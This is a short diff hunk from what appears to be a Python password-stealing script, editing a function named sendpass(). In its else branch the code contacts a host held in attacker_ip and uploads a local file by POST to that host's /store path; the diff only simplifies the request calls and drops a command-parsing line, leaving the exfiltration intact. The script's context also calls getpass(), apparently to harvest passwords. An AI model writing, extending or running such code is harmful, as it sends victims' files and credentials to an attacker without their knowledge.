@@ -183,13 +183,11 @@ def sendpass():
 		mailer.close()
 
 	else:
-		command = "grab*" + destination
-		req = requests.get('http://' + attacker_ip)
-		grab, path = command.split('*')
+		req = get('http://' + attacker_ip)
 		path = destination
 		url = 'http://' + attacker_ip + '/store'
 		files = {'file': open(path, 'rb')}
-		r = requests.post(url, files=files)
+		r = post(url, files=files)
 		return 0
 
 getpass()
